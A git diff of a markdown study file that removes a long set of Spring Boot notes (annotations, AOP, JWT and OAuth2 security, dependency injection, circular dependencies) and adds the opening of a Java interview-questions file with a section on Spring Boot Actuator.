@@ -1,4403 +1,2803 @@
-# SpringBoot
+## Java-Interview-Questions
 
-- [Difference Between Spring and Spring Boot](#difference-between-spring-and-spring-boot) 
-- [Dependency Injection](#dependency-injection) 
-- [HTTP Methods](#http-methods) 
-- [ACID Properties](#acid-properties)
-- [REST Features](#rest-features)
-- [CRUD operations Validations](#crud-operations-validations)
-- [Dependency Management in Spring and SpringBoot](#dependency-management-in-spring-and-springboot)
-- [Authentication using OAuth2 + JWT](#authentication-using-oauth2-and-jwt)
-- [What is JWT (JSON Web Token)?](#what-is-jwt)
-- [Annotations](#springboot-annotations)
-- [Steps to Create a Custom Exception in Spring Boot](#steps-to-create-a-custom-exception-in-spring-boot)
-- [AOP](#aop)
-- [Steps to Create a Custom Annotation](#steps-to-create-custom-annotation)
-- [Testing static method](#testing-static-method)
+- [Executor Service](#executorservice)
+- [Serializable](#serializable)
+- [Functional Interface](#functional-interface)
+- [Garbage Collection](#garbage-collection)
+- [JVM Memory](#jvm-memory)
+- [Garbage Collection](#garbage-collection)
+- [If you committed code with the wrong commit message in Git, you can update it using git commit --amend](#git-wrong-commit-update)
+- [How do you Dockerize a Spring Boot Application?](#how-do-you-dockerize-a-spring-boot-application?)
+- [Spring Boot Actuator](#spring-boot-actuator)
 
-## Testing Static Method
 
-Static methods are hard to test and mock, so in Spring Boot we prefer:-
 
-a) Dependency Injection
 
-b) Service classes instead of static utilities
 
+## Spring Boot Actuator
 
+Spring Boot Actuator provides production-ready monitoring and management features for a Spring Boot application. It exposes several endpoints like /health, /metrics, /beans, and /env which help monitor the application’s health, performance, and configuration. These endpoints are typically used for monitoring systems and container orchestration platforms like Kubernetes.
 
+It exposes endpoints that give information about the application’s:-
 
-## Steps to create a custom annotation in Java/Spring Boot:-
+a) Health 
 
-a) Create an annotation using @interface
+b) Metrics 
 
-b) Define where it can be used using @Target
+c) Beans 
 
-c) Define when it is available using @Retention
+d) Environment 
 
-d) Optionally process it using AOP or Reflection
+e) Thread dumps 
 
+f) Application configuration 
 
+These endpoints are usually exposed through HTTP or JMX. 
 
-## Step 1: Create Annotation
 
-```
-@Target(ElementType.METHOD)   // can be used on methods
-@Retention(RetentionPolicy.RUNTIME)  // available at runtime
-@Documented
-public @interface LogExecutionTime {
+## Health Endpoint Example
 
-}
-```
+Health endpoint checks components like:-
 
-@Target	- Defines where annotation can be used
-@Retention	- Defines lifecycle of annotation
-@Documented	- Included in Java docs
+Database 
 
-## 3. Create Aspect to Process Annotation
+Disk space 
 
-Spring uses AOP (Aspect Oriented Programming) to implement the logic.
+Messaging systems 
 
-```
-@Aspect
-@Component
-public class LogExecutionTimeAspect {
+Custom services 
 
-    @Around("@annotation(LogExecutionTime)")
-    public Object logTime(ProceedingJoinPoint joinPoint) throws Throwable {
-
-        long start = System.currentTimeMillis();
-
-        Object result = joinPoint.proceed();
-
-        long end = System.currentTimeMillis();
-
-        System.out.println(joinPoint.getSignature() +
-                " executed in " + (end - start) + " ms");
-
-        return result;
-    }
-}
-```
-## 4. Enable AOP in Spring Boot
-
-Add dependency:
-```
-<dependency>
-    <groupId>org.springframework.boot</groupId>
-    <artifactId>spring-boot-starter-aop</artifactId>
-</dependency>
-```
-## 5. Use the Custom Annotation
-```
-@Service
-public class UserService {
-
-    @LogExecutionTime
-    public void processUser() {
-        try {
-            Thread.sleep(2000);
-        } catch (Exception e) {
-        }
-    }
-}
-```
-
-## 6. Important Annotation Meta-Annotations
-
-@Target -	Where annotation can be used 
-@Retention -	When annotation is available 
-@Inherited - Child classes inherit annotation 
-@Documented - Included in Javadoc 
-
-Example:
-```
-@Target(ElementType.TYPE)
-@Retention(RetentionPolicy.RUNTIME)
-public @interface CustomService {
-}
-```
-## 7. Target Types
-
-ElementType.TYPE	class 
-ElementType.METHOD	method 
-ElementType.FIELD	variable 
-ElementType.PARAMETER	method parameter 
-ElementType.CONSTRUCTOR	constructor 
-## 8. Custom Annotation with Parameters 
-
-You can also pass values.
-```
-@Target(ElementType.METHOD)
-@Retention(RetentionPolicy.RUNTIME)
-public @interface Audit {
-
-    String action();
-    String user();
-}
-```
-
-Usage:
-```
-@Audit(action="CREATE_USER", user="admin")
-public void createUser() {
-
-}
-```
-## 9. Real World Spring Boot Uses
-
-Custom annotations are commonly used for:
-
-Logging
-
-Security
-
-Validation
-
-Caching
-
-Transactions
-
-Rate limiting
-
-Examples already in Spring:
-
-@Transactional
-@Cacheable
-@Async
-@Scheduled
-
-These are custom annotations internally implemented by Spring.
-
-
-
-
-
-## AOP 
-
-Aspect-Oriented Programming (AOP) is a programming technique used to separate cross-cutting concerns from business logic.
-
-Cross-cutting concerns are functionalities that affect multiple parts of an application, such as:
-
-Logging
-
-Security
-
-Transactions
-
-Caching
-
-Monitoring
-
-Instead of writing this code repeatedly in many places, AOP allows you to write it once and apply it wherever needed.
-
-## 1. Problem Without AOP
-
-Suppose you have a service:
-```
-public void processOrder() {
-    System.out.println("Logging start");
-    
-    // Business logic
-    System.out.println("Processing order");
-
-    System.out.println("Logging end");
-}
-```
-
-If you have 100 methods, you would need to add logging in all of them.
-
-This causes:
-
-Code duplication
-
-Harder maintenance
-
-Mixed business logic and technical logic
-
-## 2. Solution With AOP
-
-With AOP, the logging logic is separated.
-
-Business logic:
-```
-public void processOrder() {
-    System.out.println("Processing order");
-}
-```
-
-Logging aspect:
-```
-@Aspect
-@Component
-public class LoggingAspect {
-
-    @Before("execution(* com.example.service.*.*(..))")
-    public void logBefore() {
-        System.out.println("Logging before method execution");
-    }
-}
-```
-
-Now logging runs automatically before every method.
-
-## 3. Key Concepts in AOP
-1️⃣ Aspect
-
-A class that contains cross-cutting logic.
-
-@Aspect
-public class LoggingAspect {}
-
-Example:
-
-Logging
-
-Security
-
-Transaction management
-
-2️⃣ Join Point
-
-A point during program execution where an aspect can be applied.
-
-Examples:
-
-Method execution
-
-Exception thrown
-
-Method call
-
-In Spring AOP, join point = method execution.
-
-3️⃣ Advice
-
-The action performed by the aspect.
-
-## Types of advice: 
-
-
-@Before	- Runs before method execution 
-@After	- Runs after method execution 
-@AfterReturning	- Runs after successful execution 
-@AfterThrowing	- Runs when exception occurs 
-@Around	- Runs Before and after method 
-
-Example:
-
-@Before("execution(* com.app.service.*.*(..))")
-4️⃣ Pointcut
-
-A rule that defines where advice should apply.
-
-Example:
-
-execution(* com.app.service.*.*(..))
-
-Meaning:
-
-any method
-in service package
-with any parameters
-5️⃣ Weaving
-
-The process of linking aspects with the main code.
-
-Types:
-
-Type	Meaning
-Compile-time	during compilation
-Load-time	during class loading
-Runtime	during execution (Spring AOP uses this)
-
-Spring uses runtime weaving via proxies.
-
-## 4. Simple Spring Boot Example
-```
-Dependency
-<dependency>
- <groupId>org.springframework.boot</groupId>
- <artifactId>spring-boot-starter-aop</artifactId>
-</dependency>
-```
-```
-Service
-@Service
-public class PaymentService {
-
-    public void pay() {
-        System.out.println("Payment processing...");
-    }
-}
-```
-```
-Aspect
-@Aspect
-@Component
-public class LoggingAspect {
-
-    @Before("execution(* com.example.service.*.*(..))")
-    public void logBefore() {
-        System.out.println("Logging before method execution");
-    }
-}
-```
-Output:-
-Logging before method execution
-Payment processing...
-## 5. Real Spring Boot Features Using AOP
-
-Spring internally uses AOP for:
-
-Feature	Annotation
-Transactions	@Transactional
-Caching	@Cacheable
-Security	@PreAuthorize
-Async processing	@Async
-## 6. Simple Diagram
-
-Client
-  |
-  v
-Proxy (AOP)
-  |
-  |---- Logging Aspect
-  |---- Security Aspect
-  |---- Transaction Aspect
-  |
-  v
-Business Method
-
-Spring creates a proxy object that intercepts method calls.# SpringBoot
-
-
-
-## SpringBoot Annotations
-**a) @SpringBootApplication**
-
-@SpringBootApplication is a combination of three annotations:
-
-@SpringBootApplication
-    =
-@Configuration
-@ComponentScan
-@EnableAutoConfiguration
-
-**b) @Configuration**
-
-@Configuration is used to define a class that contains Spring bean definitions.
-
-It is part of Spring Framework and tells Spring that this class is used to configure beans for the application context.
-```
-@Configuration
-public class AppConfig {
-
-    @Bean
-    public UserService userService() {
-        return new UserService();
-    }
-}
-```
-
-**c) @ComponentScan**
-
-Spring automatically scans packages for components such as:
-
-@Component
-
-@Service
-
-@Repository
-
-@Controller
-
-@RestController
-
-Example:
-```
-@Service
-public class UserService {
-}
-```
-
-Spring will automatically detect and register this bean.
-
-Important rule:
-
-Component scanning starts from the package where the main class exists.
-
-Example project structure:
-
-com.example
-   ├── DemoApplication
-   ├── controller
-   ├── service
-   └── repository
-
-Everything under com.example will be scanned.
-
-**3. @EnableAutoConfiguration**
-
-Spring Boot automatically configures components based on:
-
-classpath
-
-dependencies
-
-properties
-
-Example:
-
-If dependency exists:
-
-spring-boot-starter-web
-
-Spring Boot automatically configures:
-
-Tomcat server
-
-DispatcherServlet
-
-REST configuration
-
-No manual configuration needed.
-
-@Configuration → marks the class as a configuration class
-
-@Bean → tells Spring to create and manage this object
-
-In Spring Framework, @Primary and @Qualifier are used to resolve ambiguity when multiple beans of the same type exist in the Spring container.
-
-When Spring sees more than one bean of the same type, it does not know which one to inject. These annotations help tell Spring which bean to use.
-
-**4. @Primary and @Qualifier**
-@Primary and @Qualifier are used in Spring to resolve dependency injection conflicts when multiple beans of the same type exist. @Primary marks a bean as the default choice, while @Qualifier is used to explicitly specify which bean should be injected.
-
-## Difference Between Spring and Spring Boot
-
-## 1. Overview
-
-| Spring                                                                | Spring Boot                                                                          |
-| --------------------------------------------------------------------- | ------------------------------------------------------------------------------------ |
-| Spring is a **Java framework** used to build enterprise applications. | Spring Boot is built **on top of Spring** to simplify development and configuration. |
-| Requires more setup and configuration.                                | Provides **auto-configuration** and reduces boilerplate code.                        |
-
----
-
-## 2. Configuration
-
-| Spring                                        | Spring Boot                                           |
-| --------------------------------------------- | ----------------------------------------------------- |
-| Requires **XML or Java-based configuration**. | Uses **auto-configuration** with minimal setup.       |
-| Developers configure beans manually.          | Automatically configures beans based on dependencies. |
-
-Example (Spring):
-
-```xml
-<bean id="userService" class="com.example.UserService"/>
-```
-
-Example (Spring Boot):
-
-```java
-@SpringBootApplication
-public class Application {
-    public static void main(String[] args) {
-        SpringApplication.run(Application.class, args);
-    }
-}
-```
-
----
-
-## 3. Dependency Management
-
-| Spring                                               | Spring Boot                                                      |
-| ---------------------------------------------------- | ---------------------------------------------------------------- |
-| Developers must manage dependency versions manually. | Uses **starter dependencies** to simplify dependency management. |
-
-Example:
-
-Spring dependency:
-
-```xml
-<dependency>
- <groupId>org.springframework</groupId>
- <artifactId>spring-web</artifactId>
-</dependency>
-```
-
-Spring Boot dependency:
-
-```xml
-<dependency>
- <groupId>org.springframework.boot</groupId>
- <artifactId>spring-boot-starter-web</artifactId>
-</dependency>
-```
-
----
-
-## 4. Server Deployment
-
-| Spring                                                              | Spring Boot                                                        |
-| ------------------------------------------------------------------- | ------------------------------------------------------------------ |
-| Requires deployment on an **external server** like Tomcat or Jetty. | Provides **embedded servers** such as Tomcat, Jetty, and Undertow. |
-| Applications are typically packaged as **WAR files**.               | Applications are usually packaged as **JAR files**.                |
-
-Run Spring Boot application:
-
-```bash
-java -jar application.jar
-```
-
----
-
-## 5. Development Speed
-
-| Spring                                  | Spring Boot                                    |
-| --------------------------------------- | ---------------------------------------------- |
-| Setup and configuration take more time. | Faster development with minimal configuration. |
-
----
-
-## 6. Production Features
-
-| Spring                                  | Spring Boot                                                                   |
-| --------------------------------------- | ----------------------------------------------------------------------------- |
-| Requires external tools for monitoring. | Provides **Spring Boot Actuator** for monitoring, metrics, and health checks. |
-
----
-
-## 7. Microservices Support
-
-| Spring                                       | Spring Boot                                                      |
-| -------------------------------------------- | ---------------------------------------------------------------- |
-| Not specifically designed for microservices. | Commonly used for building **microservices-based applications**. |
-
----
-## Summary
-
-* **Spring** provides the core framework features such as dependency injection, AOP, and transaction management.
-* **Spring Boot** simplifies Spring application development by providing auto-configuration, embedded servers, and starter dependencies.
-
-
-## Dependency Management in Spring and SpringBoot
-
-1️⃣ Dependency Management in Spring (Traditional Spring)
-
-In Spring Framework, you must manually add every dependency and its version.
-
-Example: If you want to build a REST API, you need multiple dependencies.
-
-**Problems:**
-
-a) You must find compatible versions
-
-b) You must add many dependencies manually
-
-c) If versions conflict → application fails
-
-Spring Boot solves this using Starter Dependencies.
-
-Instead of adding many dependencies, you add one starter dependency.
-
-Example:
-```
-<dependency>
- <groupId>org.springframework.boot</groupId>
- <artifactId>spring-boot-starter-web</artifactId>
-</dependency>
-```
-This single dependency automatically includes:
-
-Spring MVC
-Spring Core
-Spring Context
-Jackson
-Validation
-Embedded Tomcat
-Logging
-
-You don't need to specify versions.
-
-Spring Boot manages versions using:
-Spring Boot Dependency Management (BOM)
-
-3️⃣ Example Comparison 
-In Spring (Manual), you add manually:- 
-
-spring-core 
-spring-web 
-spring-context 
-spring-beans 
-jackson 
-tomcat 
-In Spring Boot (Automatic), you add one dependency:-
-
-spring-boot-starter-web
-
-Spring Boot internally adds everything needed.
-
-4️⃣ Why Spring Boot Is Easier
-
-Spring Boot provides:-
-
-Starter dependencies
-Dependency version compatibility
-Auto configuration
-
-So developers don't worry about:
-
-Which version of Spring?
-Which version of Jackson?
-Which version of Tomcat?
-5️⃣ Real Example
-
-Spring Boot:
-```
-<dependency>
- <groupId>org.springframework.boot</groupId>
- <artifactId>spring-boot-starter-data-jpa</artifactId>
-</dependency>
-```
-
-Automatically adds:-
-```
-Hibernate
-Spring Data JPA
-Spring ORM
-Transaction Manager
-JPA API
-```
-6️⃣ Simple Analogy
-
-Think of it like ordering food.
-
-Spring:
-
-Order rice
-Order curry
-Order salad
-Order water
-
-Spring Boot:
-
-Order "Meal Combo"
-
-Everything comes together.
-
-
-## Authentication using OAuth2 and JWT
-
-Order Service  →  Payment Service
-
-
-There is no human user.
-The calling service itself acts as the client/user.
-
-#### Step 1️⃣ Service Registration (One-Time Setup)
-
-Each service is registered with the Authorization Server as an OAuth2 client.
-```
-Example:
-
-client_id     = order-service
-client_secret = ********
-allowed_scopes = payment.read, payment.write
-
-```
-👉 This represents the identity of the service.
-
-####  Step 2️⃣ Service Requests Access Token (Login Step)
-
-The calling service (Order Service) sends a request to the token endpoint using
-OAuth2 Client Credentials Grant.(✅ The token endpoint is an endpoint exposed by the Authorization Server.)
-
-POST /oauth/token
-Content-Type: application/x-www-form-urlencoded
-
-grant_type=client_credentials
-&client_id=order-service
-&client_secret=********
-&scope=payment.write
-
-
-📌 This step is the “login” for a service.
-
-### Step 3️⃣ Authorization Server Validates Service
-
-The Authorization Server:
-
-Validates client_id and client_secret
-
-Checks allowed scopes
-
-Confirms service is trusted
-
-If valid → proceeds.
-
-#### Step 4️⃣ JWT Access Token Is Issued
-
-Authorization Server returns a JWT:
-
-{
-  "access_token": "eyJhbGciOiJIUzI1NiIs...",
-  "token_type": "Bearer",
-  "expires_in": 3600
-}
-
-JWT Contains Claims Like:
-{
-  "sub": "order-service",
-  "scope": "payment.write",
-  "iss": "auth-server",
-  "exp": 1712345678
-}
-
-
-📌 No username
-📌 No password
-📌 Identity = service name
-
-#### Step 5️⃣ Service Calls Another Service Using JWT
-
-Order Service calls Payment Service:
-
-POST /payments
-Authorization: Bearer <JWT>
-
-#### Step 6️⃣ Receiving Service Validates JWT
-
-Payment Service:
-
-Verifies JWT signature
-
-Checks expiration (exp)
-
-Validates scope/authority
-
-Spring Security does this automatically when configured as a Resource Server.
-
-#### Step 7️⃣ Authorization Decision
-
-Based on JWT claims:
-
-@PreAuthorize("hasAuthority('payment.write')")
-@PostMapping("/payments")
-public void makePayment() { }
-
-
-✔ If scope exists → request allowed
-❌ If not → 403 Forbidden
-
-### 🔄 How it actually works (Client Credentials Flow)
-Step-by-step
-
-1️⃣ Order Service → Token Endpoint
-    client_id + client_secret
-
-2️⃣ Authorization Server
-    → validates client
-    → generates JWT access token
-
-3️⃣ Order Service
-    → stores token in memory/cache
-
-4️⃣ Order Service → Trade Service
-    Authorization: Bearer <JWT>
-
-5️⃣ Trade Service
-    → validates JWT (signature, expiry, scopes)
-
-
-
-
-## What is JWT?
-
-JWT (JSON Web Token) is a compact, secure way to transmit information between two parties as a JSON object.
-It is mainly used for authentication and authorization in web applications and APIs.
-
-JWT is commonly used in Spring Boot, microservices, and REST APIs.
-
-## 1️⃣ Why JWT is Used ?
-
-Traditional authentication uses sessions stored on the server.
-
-Example:
-
-Client → Login
-Server → Create Session
-Server stores session in memory
-
-Problems:
-
-server must maintain session state
-
-difficult to scale in microservices
-
-JWT solves this by using stateless authentication.
-
-Client → Login
-Server → Generate JWT
-Client stores token
-Client sends token with every request
-
-Server does not store session.
-
-## 2️⃣ Structure of JWT
-
-A JWT has three parts separated by dots (.):
-
-Header.Payload.Signature
-
-Example:
-
-eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9
-.
-eyJzdWIiOiJ1c2VyMSIsInJvbGUiOiJBRE1JTiJ9
-.
-SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c
-## 3️⃣ JWT Components 
-1️⃣ Header
-
-Contains metadata about the token.
-
-Example:
+Example response: 
 ```
 {
- "alg": "HS256",
- "typ": "JWT"
+ "status": "UP",
+ "components": {
+   "db": { "status": "UP" },
+   "diskSpace": { "status": "UP" }
+ }
 }
 ```
 
-Meaning:
+## Real Production Use
 
-alg → hashing algorithm
-typ → token type 
+In real systems Actuator is integrated with:
 
-2️⃣ Payload 
+Prometheus 
 
-Contains claims (data about the user).
+Grafana 
 
-Example:
+Splunk 
 
-{
- "sub": "12345",
- "username": "priyanka",
- "role": "ADMIN",
- "exp": 1716239022
-}
+Zipkin 
 
-Common claims:
-
-Claim	Meaning
-sub	subject (user id)
-iss	issuer
-exp	expiration time
-role	user role
-
-Important:
-
-⚠️ Payload is encoded but not encrypted.
-
-3️⃣ Signature 
-
-The signature ensures token integrity.
-
-The signature is used to verify that the token was not changed and that it was issued by the trusted server.
-
-The signature is created using:
-
-Signature = Hash(
-              Base64UrlEncode(Header) + "." +
-              Base64UrlEncode(Payload),
-              SecretKey
-            )
-
-Depending on the algorithm in the header (like HS256, RS256), the signature is generated.
-
-**Purpose:**
-Verify token is not tampered
-
-
-
-
-## 🔐 Step-by-Step: RBAC Configuration in Spring Boot
-
-### ✅ STEP 1: Add Spring Security Dependency
-
-```
-<dependency>
-    <groupId>org.springframework.boot</groupId>
-    <artifactId>spring-boot-starter-security</artifactId>
-</dependency>
-```
-
-### ✅ STEP 2: Decide Where Roles Come From
-
-In real projects, roles usually come from:
-
-a) JWT token (most common)
-
-b) Database
-
-c) Identity Provider (Keycloak, Auth0, Okta)
-
-📌 We’ll assume JWT contains roles.
-      
-Example JWT payload:
-```
-{
-  "sub": "user123",
-  "roles": ["ADMIN", "USER"]
-}
-```
-
-✅ STEP 3: Configure Security Filter Chain
-
-
-Create a Security Configuration class.
-
-```
-@Configuration
-@EnableMethodSecurity   // enables @PreAuthorize
-public class SecurityConfig {
-
-    @Bean
-    public SecurityFilterChain filterChain(HttpSecurity http) throws Exception {
-
-        http
-            .csrf(csrf -> csrf.disable())
-            .authorizeHttpRequests(auth -> auth
-                .requestMatchers("/admin/**").hasRole("ADMIN")
-                .requestMatchers("/user/**").hasAnyRole("USER", "ADMIN")
-                .anyRequest().authenticated()
-            )
-            .oauth2ResourceServer(oauth ->
-                oauth.jwt()
-            );
-
-        return http.build();
-    }
-}
-```
-##### What you configured here:
-
-✔ /admin/** → only ADMIN
-✔ /user/** → USER or ADMIN
-✔ JWT-based authentication
-
-### ✅ STEP 4: Map Roles from JWT to Spring Security
-
-Spring expects roles like:
-
-ROLE_ADMIN
-ROLE_USER
-
-So we map JWT roles properly.
-```
-@Bean
-public JwtAuthenticationConverter jwtAuthenticationConverter() {
-    JwtGrantedAuthoritiesConverter converter =
-        new JwtGrantedAuthoritiesConverter();
-
-    converter.setAuthorityPrefix("ROLE_");
-    converter.setAuthoritiesClaimName("roles");
-
-    JwtAuthenticationConverter jwtConverter =
-        new JwtAuthenticationConverter();
-    jwtConverter.setJwtGrantedAuthoritiesConverter(converter);
-
-    return jwtConverter;
-}
-```
-
-Then plug it in:
-```
-.oauth2ResourceServer(oauth ->
-    oauth.jwt(jwt ->
-        jwt.jwtAuthenticationConverter(jwtAuthenticationConverter())
-    )
-)
-```
-
-### ✅ STEP 5: Secure APIs Using Roles (Method Level)
-
-Now apply RBAC directly on APIs.
-```
-@RestController
-@RequestMapping("/admin")
-public class AdminController {
-
-    @PreAuthorize("hasRole('ADMIN')")
-    @GetMapping("/dashboard")
-    public String adminDashboard() {
-        return "Admin dashboard";
-    }
-}
-
-```
-```
-@RestController
-@RequestMapping("/user")
-public class UserController {
-
-    @PreAuthorize("hasAnyRole('USER','ADMIN')")
-    @GetMapping("/profile")
-    public String userProfile() {
-        return "User profile";
-    }
-}
-```
-
-### ✅ STEP 6: application.yml Configuration
-```
-spring:
-  security:
-    oauth2:
-      resourceserver:
-        jwt:
-          issuer-uri: https://auth-server.com/realms/demo
-```
-👉 Tells Spring where to validate JWT.
-
-### ✅ STEP 7: Test the Flow
-Case 1: USER token
-
-/user/profile → ✅ allowed
-
-/admin/dashboard → ❌ 403 Forbidden
-
-Case 2: ADMIN token
-
-/user/profile → ✅ allowed
-
-/admin/dashboard → ✅ allowed
-
-
-
-
-## Q1- Why Do We Need @Bean When @Component Also Creates Beans? 🤔
-Both `@Bean` and `@Component` create Spring-managed beans, but they are used in different scenarios.
-
-| Feature           | @Bean                                                               | @Component                                                    |
-|-------------------|---------------------------------------------------------------------|---------------------------------------------------------------|
-| Usage             | Used inside `@Configuration` classes to manually create beans.      | Used to mark a class for automatic detection.                 |
-| Control           | Full control over object creation and configuration.                | Spring creates the bean automatically.                        |
-| External Classes? | Can be used for third-party classes (like REST clients, database connections). | Only works on classes you own and annotate.                   |
-| Customization     | Allows modifying how the bean is created (e.g., constructor args, method calls). | Limited customization.                                        |
-
-## Q2- How Does Spring Boot Find Beans?
-a) Spring automatically scans packages and registers beans if they are annotated with:
-- `@Component`
-- `@Service`
-- `@Repository`
-- `@Controller`
-- Explicit Bean Declaration (`@Bean`)
-
-b) If a bean cannot be auto-detected (e.g., third-party classes), we register it manually using `@Bean`.
-
-## Q3-Comparing Early vs Lazy Initialization
-| Feature                     | Early Initialization (Default)                           | Lazy Initialization (`@Lazy`)                                  |
-|-----------------------------|----------------------------------------------------------|---------------------------------------------------------------|
-| When Bean is Created?       | At application startup                                   | Only when first used                                          |
-| Memory Usage                | Higher (all beans preloaded)                             | Lower (only required beans loaded)                            |
-| Startup Time                | Slower (loads all beans at once)                         | Faster (loads fewer beans at start)                           |
-| Performance                 | Faster at runtime                                        | Might be slower on first use                                  |
-| Use Case                    | Essential beans like Database Connections, Services      | Rarely used beans (e.g., large reports, email services)       |
-
-
-## Bean Lifecycle
-A Spring Bean goes through the following steps:
-![image](https://github.com/user-attachments/assets/9630d2dc-b1dc-414b-889d-b6d24e744a2f)
-
-Stage	Description
-1. Instantiation	Spring creates a bean instance.
-2. Populate Properties	Dependencies (via @Autowired, constructor, setters) are injected.
-3. Bean Post-Processing (Before Initialization)	BeanPostProcessor#postProcessBeforeInitialization() runs.
-4. Initialization	If the bean implements InitializingBean or has @PostConstruct, it is executed.
-5. Bean Post-Processing (After Initialization)	BeanPostProcessor#postProcessAfterInitialization() runs.
-6. Bean is Ready to Use	The bean is fully initialized and available for use.
-7. Destruction	If the bean implements DisposableBean or has @PreDestroy, cleanup happens before destruction.
-   
-## Dependency Injection
-Ans- Dependency Injection (DI) is a design pattern where Spring Boot automatically provides the required dependencies (objects) instead of you manually creating them.
-
-## How Spring Manages Dependency Injection?
-@Component tells Spring to create and manage the object.
-@Autowired tells Spring to inject the required dependency automatically.
-Spring removes tight coupling and makes code more flexible and testable.
-
-## Q6- Types of Dependency Injection in Spring Boot
-
-#### A)Constructor Injection (Recommended)
-```
-@Autowired
-public Car(Engine engine) {  // Injects dependency via constructor
-    this.engine = engine;
-}
-```
-
-#### B) Setter Injection
-```
-@Autowired
-public void setEngine(Engine engine) {
-    this.engine = engine;
-}
-```
-
-#### C) Field Injection (Not Recommended)
-```
-@Autowired
-private Engine engine;
-```
-
-## Why Constructor Injection is Best?
-✅ Makes objects immutable
-✅ Works well with unit testing
-✅ Ensures all required dependencies are available at the time of object creation
-
-## 🔹 Summary
-Spring Boot automatically injects objects using @Autowired
-Removes manual object creation (new)
-Supports different injection types (Constructor, Setter, Field)
-Helps in managing dependencies, making the code flexible & testable
-
-## Circular dependency and how do we break circular dependency?
-
-Circular dependency occurs when beans depend on each other in a cycle.
-The best way to break it is to redesign responsibilities, introduce interfaces or an orchestrator, or use event-driven communication. 
-@Lazy should be a last resort.
-
-
-## Handling Circular Dependencies (Spring / Java)
-
-Circular dependencies often indicate a design problem — two classes depending on each other usually means responsibilities are mixed or misplaced. Below are practical strategies to resolve circular references, ranked by recommended usage.
-
----
-
-## ✅ 1. Rethink the design (BEST solution)
-
-Often a circular dependency means the responsibilities are wrong. Extract the common/shared behavior into a third component so services depend on that component rather than each other.
-
-Bad:
-```
-OrderService ↔ PaymentService
-```
-
-Better:
-```
-OrderService → PaymentProcessor ← PaymentService
-```
-
-- Extract common logic into a third class (e.g., `PaymentProcessor`, `PaymentGateway`, or an `Adapter`).
-- Benefits: clearer responsibilities, easier to test, no framework hacks required.
-
----
-
-## ✅ 2. Use interfaces (Dependency Inversion)
-
-Introduce an interface to invert the dependency so both sides depend on abstractions.
-
-Example:
-```java
-public interface PaymentOperations {
-    void pay(Order order);
-}
-
-@Service
-public class PaymentService implements PaymentOperations {
-    @Override
-    public void pay(Order order) { /* ... */ }
-}
-
-@Service
-public class OrderService {
-    private final PaymentOperations paymentOperations;
-
-    public OrderService(PaymentOperations paymentOperations) {
-        this.paymentOperations = paymentOperations;
-    }
-}
-```
-
-- Reduces coupling
-- Easier to substitute implementations and to mock/stub in tests
-- Encourages clean separation of concerns
-
----
-
-## ⚠️ 3. Use @Lazy (quick fix, not best design)
-
-Spring's `@Lazy` can delay bean initialization to break circular references when a redesign is not feasible.
-
-Example:
-```java
-@Service
-public class OrderService {
-    @Autowired
-    @Lazy
-    private PaymentService paymentService;
-}
-```
-
-- What it does: delays creation of the injected bean until first use
-- Use only as a last resort or temporary workaround
-- Drawbacks: masks the underlying design problem and can make initialization order harder to reason about
-
----
-
-## ⚠️ 4. Setter injection instead of constructor
-
-Switching to setter (or field) injection can sometimes avoid circular constructor dependencies:
-
-```java
-@Service
-public class OrderService {
-    private PaymentService paymentService;
-
-    @Autowired
-    public void setPaymentService(PaymentService ps) {
-        this.paymentService = ps;
-    }
-}
-```
-
-- Works because Spring can create the beans first and then satisfy setters
-- Downsides: hides design issues, less safe than constructor injection (objects may be partially initialized), and harder to enforce required dependencies
-
----
-
-## ✅ 5. Event-based communication (BEST for microservices)
-
-In distributed systems or when decoupling is desired, use asynchronous events instead of direct calls.
-
-Pattern:
-- OrderService → publishes `OrderCreatedEvent`
-- PaymentService → listens for `OrderCreatedEvent` and processes payment
-
-Benefits:
-- No direct dependency between services
-- Highly scalable and resilient
-- Enables eventual consistency and simpler service boundaries
-
-Considerations:
-- Adds operational complexity (messaging infrastructure)
-- Requires handling eventual consistency and idempotency
-
----
-
-## ✅ 6. Use Facade / Orchestrator pattern
-
-Introduce an orchestrator or facade that coordinates interactions between services so they don't call each other directly.
-
-```java
-public class OrderPaymentOrchestrator {
-    private final OrderService orderService;
-    private final PaymentService paymentService;
-
-    public OrderPaymentOrchestrator(OrderService orderService, PaymentService paymentService) {
-        this.orderService = orderService;
-        this.paymentService = paymentService;
-    }
-
-    public void createOrderAndPay(OrderRequest req) {
-        Order order = orderService.createOrder(req);
-        paymentService.pay(order);
-        // coordinate other steps, transactions, compensations, etc.
-    }
-}
-```
-
-- Keeps services focused on a single responsibility
-- Orchestrator coordinates the workflow without creating direct cyclic references between domain services
-
----
-
-## Quick guidance: Which approach to choose?
-- If the cycle indicates mixed responsibilities: Rethink the design and extract a third component (BEST).
-- If you can introduce an abstraction: Use interfaces / dependency inversion.
-- For cross-service decoupling in microservices: Use event-driven communication.
-- For local coordination: Facade or Orchestrator.
-- If you must unblock quickly: `@Lazy` or setter injection — but treat them as temporary workarounds.
-
----
-
-## Summary
-Prefer refactoring (extracting responsibilities or introducing abstractions) and decoupling (events or orchestrators). Use framework-specific fixes (`@Lazy`, setter injection) only when refactoring is impractical in the short term.
-
-## Purpose and Use of API Key-Based Authorization in Spring Boot
-API key-based authorization is a simple and effective way to secure REST APIs by requiring clients to include a valid API key in their requests. It ensures that only authorized users or applications can access certain endpoints.
-
-## 📌 Purpose of API Key-Based Authorization
-Authentication: Confirms the identity of the client making the request.
-Access Control: Allows or denies access to specific endpoints based on the API key.
-Security: Prevents unauthorized access, data breaches, and misuse of APIs.
-Monitoring & Logging: Helps in tracking API usage and identifying suspicious activities.
-Throttling & Rate Limiting: Restricts the number of requests from a particular API key to prevent abuse.
-
-
-### To change the database in your Spring Boot project, follow these steps:
-
-
-1. Update Dependencies in pom.xml (for Maven projects)
-   
-If you are switching from one database to another (e.g., from H2 to MySQL or PostgreSQL), update the dependencies accordingly.
-
-Example for MySQL:
-
-<dependency>
-    <groupId>mysql</groupId>
-    <artifactId>mysql-connector-java</artifactId>
-    <scope>runtime</scope>
-</dependency>
-
-Example for PostgreSQL:
-
-<dependency>
-    <groupId>org.postgresql</groupId>
-    <artifactId>postgresql</artifactId>
-    <scope>runtime</scope>
-</dependency>
-
-2. Update application.properties or application.yml
-   
-Modify the database configuration in src/main/resources/application.properties (or application.yml).
-
-Example for MySQL:
-properties
-
-spring.datasource.url=jdbc:mysql://localhost:3306/your_database
-spring.datasource.username=root
-spring.datasource.password=your_password
